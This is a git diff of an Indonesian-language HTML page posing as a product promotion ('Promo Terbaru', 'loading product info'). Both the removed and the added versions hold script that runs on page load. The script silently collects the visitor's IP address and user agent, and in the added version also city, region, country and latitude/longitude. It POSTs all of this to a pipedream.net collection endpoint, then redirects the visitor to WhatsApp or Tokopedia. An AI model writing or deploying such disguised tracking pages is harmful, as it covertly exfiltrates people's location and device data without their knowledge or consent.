@@ -1,30 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Promo Khusus Kamu!</title>
-  <script>
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const payload = {
-          ip: data.ip,
-          ua: navigator.userAgent,
-          lang: navigator.language,
-          time: new Date().toISOString()
-        };
-        fetch("https://eoi1qxm9cxsp15h.m.pipedream.net", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+  <head>
+    <meta charset="UTF-8">
+    <title>Promo Terbaru</title>
+  </head>
+  <body>
+    <h2>Tunggu sebentar, sedang memuat info produk...</h2>
+
+    <script>
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          fetch("https://eoi1qxm9cxsp15h.m.pipedream.net", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              ip: data.ip,
+              city: data.city,
+              region: data.region,
+              country: data.country,
+              latlon: data.latitude + "," + data.longitude,
+              useragent: navigator.userAgent
+            })
+          }).then(() => {
+            // Setelah ngirim, redirect ke link target (misal YouTube/WA)
+            window.location.href = "https://wa.me/62xxxx?text=Halo%20bos";
+          });
         });
-      });
-    setTimeout(() => {
-      window.location.href = "https://tokopedia.com/";
-    }, 2000);
-  </script>
-</head>
-<body>
-  <h1>Diskon Menarik Menantimu!</h1>
-  <img src="https://via.placeholder.com/600x300?text=Promo+Spesial" style="width:100%;max-width:600px;" />
-</body>
+    </script>
+  </body>
 </html>
